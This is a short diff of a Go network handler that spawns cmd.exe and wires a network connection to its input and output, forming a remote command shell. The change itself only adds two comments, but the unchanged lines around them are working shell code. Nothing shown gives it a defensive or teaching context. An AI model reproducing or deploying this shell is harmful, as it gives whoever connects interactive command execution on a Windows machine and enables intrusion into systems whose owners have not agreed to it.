@@ -15,10 +15,12 @@ func handle(conn net.Conn) {
 	 * For Windows use exec.Command("cmd.exe")
 	 */
 	cmd := exec.Command("cmd.exe")
+	//reader and writer pipes
 	rp, wp := io.Pipe()
 	// Set stdin to our connection
 	cmd.Stdin = conn
 	cmd.Stdout = wp
+	//copy reader pipe into connection
 	go io.Copy(conn, rp)
 	cmd.Run()
 	conn.Close()
